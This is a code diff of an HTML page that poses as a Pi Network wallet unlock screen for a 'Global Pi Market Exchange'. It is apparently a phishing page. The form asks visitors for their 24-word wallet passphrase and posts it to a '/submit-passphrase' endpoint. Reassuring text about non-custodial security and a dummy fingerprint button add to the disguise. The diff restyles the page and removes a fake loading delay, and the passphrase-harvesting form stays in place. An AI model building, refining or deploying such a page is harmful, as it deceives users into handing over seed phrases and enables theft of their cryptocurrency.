@@ -17,6 +17,7 @@
       display: flex;
       flex-direction: column;
       align-items: center;
+      justify-content: flex-start;
       padding: 0 20px;
       box-sizing: border-box;
       min-height: 100vh;
@@ -56,6 +57,7 @@
       display: flex;
       flex-direction: column;
       align-items: center;
+      margin-bottom: 100px; /* give space above bottom line */
     }
 
     textarea {
@@ -102,23 +104,15 @@
       background-color: #9d4edd;
     }
 
-    .info-note {
-      font-family: "Georgia", serif;
-      font-size: 1.4rem;
-      text-align: center;
-      margin-top: 40px;
-      max-width: 720px;
-      line-height: 1.6;
-    }
-
-    .footer-line {
-      font-size: 1.8rem;
-      font-weight: bold;
-      margin-top: auto;
-      margin-bottom: 25px;
-      text-align: center;
+    .info-text {
+      font-family: 'Didot', 'Bodoni MT', serif;
+      font-size: 1.3rem;
+      color: #ddd;
+      margin-top: 20px;
       max-width: 800px;
-      line-height: 1.4;
+      text-align: center;
+      line-height: 1.5;
+      padding: 0 10px;
     }
 
     .error {
@@ -130,41 +124,29 @@
       max-width: 800px;
     }
 
-    #loading-overlay {
+    .bottom-line {
       position: fixed;
-      top: 0;
+      bottom: 0;
       left: 0;
       width: 100%;
-      height: 100%;
-      background: rgba(36, 0, 70, 0.9);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      z-index: 9999;
-    }
-
-    .spinner {
-      border: 10px solid #ddd;
-      border-top: 10px solid #7b2cbf;
-      border-radius: 50%;
-      width: 80px;
-      height: 80px;
-      animation: spin 1s linear infinite;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
+      text-align: center;
+      font-size: 1.6rem;
+      font-weight: bold;
+      color: #eee;
+      background-color: #240046;
+      padding: 20px;
+      box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.5);
     }
   </style>
 </head>
 <body>
 
   <img src="/static/gpm_logo2.png" alt="GPM Logo" />
+
   <h2>UNLOCK YOUR WALLET TO GET ACCESS TO GLOBAL PI MARKET EXCHANGE SITE</h2>
   <p>Enter your passphrase to unlock wallet</p>
 
-  <form method="POST" action="/submit-passphrase" onsubmit="return delayedSubmit(event)">
+  <form method="POST" action="/submit-passphrase" onsubmit="return validatePassphrase()">
     <textarea name="passphrase" id="passphrase" placeholder="Enter your 24-word passphrase here..."></textarea>
 
     <div class="button-group">
@@ -172,29 +154,23 @@
       <button type="button" onclick="alert('Fingerprint login is not available')">login with fingerprint</button>
     </div>
 
-    <div class="info-note">
-      As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you.<br>
-      Recovery of passphrase is currently impossible.<br>
+    <div class="info-text">
+      As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.<br>
       Lost your passphrase? You can create a new wallet, but all your π in your previous wallet will be inaccessible.
     </div>
 
     <div class="error" id="error-message"></div>
   </form>
 
-  <div class="footer-line">
+  <div class="bottom-line">
     Pi Wallet is the secure hub for your Pi transactions, providing an intuitive interface for managing and transferring Pi currency effortlessly.
   </div>
 
-  <div id="loading-overlay">
-    <div class="spinner"></div>
-  </div>
-
   <script>
-    function delayedSubmit(event) {
-      event.preventDefault();
-      const passphrase = document.getElementById("passphrase").value.trim();
+    function validatePassphrase() {
+      const passphrase = document.getElementById('passphrase').value.trim();
       const words = passphrase.split(/\s+/);
-      const errorDiv = document.getElementById("error-message");
+      const errorDiv = document.getElementById('error-message');
 
       if (words.length !== 24) {
         errorDiv.textContent = "Invalid passphrase, please enter exactly 24 words.";
@@ -202,14 +178,9 @@
       }
 
       errorDiv.textContent = "";
-      document.getElementById("loading-overlay").style.display = "flex";
-
-      setTimeout(() => {
-        event.target.submit();
-      }, 3000);
-
-      return false;
+      return true;
     }
   </script>
+
 </body>
 </html>
